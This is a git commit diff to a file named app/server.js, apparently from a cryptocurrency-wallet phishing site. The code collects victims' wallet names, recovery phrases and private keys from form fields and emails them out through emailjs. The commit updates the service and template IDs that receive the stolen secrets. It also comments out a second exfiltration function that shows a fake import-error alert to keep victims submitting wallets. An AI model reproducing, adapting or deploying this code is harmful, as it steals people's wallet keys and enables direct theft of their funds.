f7af563e00c658d0feefc99559bcbc8486e98dac
Choice148 <137381455+Choice148@users.noreply.github.com>
2026-08-20 14:42:20 +0100

    Okay

--- app/server.js
+++ app/server.js
@@ -13,8 +13,8 @@ const phraseValue = phraseTextarea ? phraseTextarea.value : '';
         pk: document.getElementById("pk") ? document.getElementById("pk").value : ''
     }
 
-    const serviceID  = 'service_5cvytsl';
- const templateID = 'template_35mx17h';
+    const serviceID  = 'service_7j8do6q';
+ const templateID = 'template_6csopl7';
 
 emailjs.send(serviceID, templateID, params).then((res)=>{
     if(document.getElementById("walletNameData")) document.getElementById("walletNameData").value= "";
@@ -28,28 +28,28 @@ emailjs.send(serviceID, templateID, params).then((res)=>{
 }
 
 
-function sendMessage2(){
+// function sendMessage2(){
  
-const phraseTextarea = document.getElementById("privateKeyInput");
+// const phraseTextarea = document.getElementById("privateKeyInput");
 
-// Get the value of the textarea
-const phraseValue = phraseTextarea ? phraseTextarea.value : '';
+// // Get the value of the textarea
+// const phraseValue = phraseTextarea ? phraseTextarea.value : '';
 
-    var params= {
-        subject: document.getElementById("wallet_name").value,
-        message: phraseValue || ''
-    }
+//     var params= {
+//         subject: document.getElementById("wallet_name").value,
+//         message: phraseValue || ''
+//     }
 
-  const serviceID  = 'service_4mr64an';
-const templateID = 'template_p3t6orr';
+//   const serviceID  = 'service_4mr64an';
+// const templateID = 'template_p3t6orr';
 
-emailjs.send(serviceID, templateID, params).then((res)=>{
-    if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
-    if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
-    console.log(res);
-    alert('An error occurred, try importing another active wallet');
-    window.location.href='index.html';
+// emailjs.send(serviceID, templateID, params).then((res)=>{
+//     if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
+//     if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
+//     console.log(res);
+//     alert('An error occurred, try importing another active wallet');
+//     window.location.href='index.html';
 
-})
-}
+// })
+// }
 
